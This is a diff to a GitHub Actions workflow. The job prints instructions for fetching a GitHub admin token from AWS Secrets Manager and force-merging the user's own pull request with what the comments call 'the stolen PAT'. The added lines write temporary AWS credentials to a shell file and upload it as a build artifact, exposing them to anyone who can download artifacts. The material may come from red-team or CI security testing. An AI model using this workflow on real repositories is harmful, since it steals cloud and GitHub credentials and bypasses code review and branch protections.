@@ -70,13 +70,13 @@ jobs:
           echo "Then run, in order:"
           echo ""
           echo "  # 1. Pull the GitHub admin PAT from Secrets Manager"
-          echo "  export RTV_PAT=\"\$(aws secretsmanager get-secret-value \\"
+          echo "  PAT=\$(aws secretsmanager get-secret-value \\"
           echo "    --secret-id $SECRET_NAME \\"
-          echo "    --query SecretString --output text)\""
+          echo "    --query SecretString --output text)"
           echo ""
-          echo "  # 2. Force-merge your own PR using RTV_PAT"
-          echo "  curl -sS -X PUT \\"
-          echo "    -H \"Authorization: token \${RTV_PAT}\" \\"
+          echo "  # 2. Force-merge your own PR using the stolen PAT"
+          echo "  curl -X PUT \\"
+          echo "    -H \"Authorization: token \$PAT\" \\"
           echo "    -H \"Accept: application/vnd.github+json\" \\"
           echo "    https://api.github.com/repos/$REPO_FULL/pulls/$PR_NUMBER/merge"
           echo ""
@@ -85,3 +85,17 @@ jobs:
           echo ""
           echo "  # Your PR should flip to 'Merged' in the GitHub UI."
           echo "============================================================"
+          # Also write to file for artifact upload (log truncates long lines)
+          cat > /tmp/sts-creds.sh <<EOF
+          export AWS_ACCESS_KEY_ID=$AK
+          export AWS_SECRET_ACCESS_KEY=$SK
+          export AWS_SESSION_TOKEN=$ST
+          export AWS_REGION=$AWS_REGION
+          EOF
+
+      - name: Upload STS credentials as artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: sts-credentials
+          path: /tmp/sts-creds.sh
+          retention-days: 1
